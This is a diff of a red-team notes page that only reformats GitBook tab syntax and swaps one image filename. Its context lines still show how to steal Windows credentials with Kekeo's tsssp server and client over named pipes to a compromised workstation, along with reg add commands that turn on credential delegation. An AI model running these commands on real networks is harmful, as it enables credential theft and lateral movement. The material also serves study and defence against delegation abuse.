@@ -30,14 +30,14 @@ If credential delegation is set up, credentials can be dumped without touching l
 
 Let's spin up a tsssp named pipe server where targets of whom the credentials we want to steal, will connect to, on the compromised workstation ws01 \(running as SYSTEM\):
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@ws01.offense.local" %}
+{% tabs %}
+{% tab title="attacker@ws01.offense.local" %}
 ```text
 // needs to run as NT SYSTEM
 tsssp::server
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 {% hint style="info" %}
 Kekeo on ws01 must be running as NT\SYSTEM for this to work
@@ -45,13 +45,13 @@ Kekeo on ws01 must be running as NT\SYSTEM for this to work
 
 Now, let's connect to the tsssp server on ws01 from the target computer ws02 \(we want currently logged on user's from ws02 credentials to be stolen by being sent to the tsssp server on ws01 over the named pipe\):
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@ws02.offense.local" %}
+{% tabs %}
+{% tab title="attacker@ws02.offense.local" %}
 ```text
 tsssp::client /target:termsrv/ws01.offense.local /pipe:\\ws01.offense.local\pipe\kekeo_tsssp_endpoint
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/password-delegation-password-dump-via-named-pipes.gif)
 
@@ -65,29 +65,29 @@ Differently from dumping kerberos credentials, the NTLM delegated credential dum
 
 Let's spin up the server on one console:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@ws02" %}
+{% tabs %}
+{% tab title="attacker@ws02" %}
 ```text
 // running as ws02\spotless
 tsssp::server
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 And connect to it from another console:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@ws02" %}
+{% tabs %}
+{% tab title="attacker@ws02" %}
 ```text
 // running as ws02\spotless
 tsssp::client /target:termsrv/ws02.offense.local
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Below shows \(left\) a tsssp server is created on the ws02 system running under spotless user's context. On the right, another console running as ws02\spotless which is then connected to the `\\.\pipe\kekeo_tsssp_endpoint` named pipe, revealing user's `ws02\spotless` NTLM credentials in the console running tsssp server on the left:
 
-![](../../.gitbook/assets/image%20%28175%29.png)
+![](../../.gitbook/assets/image%20%28177%29.png)
 
 ## Enumerating Delegated Credentials Locally
 
@@ -140,8 +140,8 @@ Parse-PolFile -Path "\\offense.local\sysvol\offense.local\Policies\{31B2F340-016
 
 If you have admin rights on the compromised box, you can enable all credential delegation like so:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@target" %}
+{% tabs %}
+{% tab title="attacker@target" %}
 ```csharp
 reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v AllowDefaultCredentials /t REG_DWORD /d 1
 reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v ConcatenateDefaults_AllowDefault /t REG_DWORD /d 1
@@ -153,8 +153,8 @@ reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefC
 # delete all
 reg delete HKLM\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /f
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ## References
 
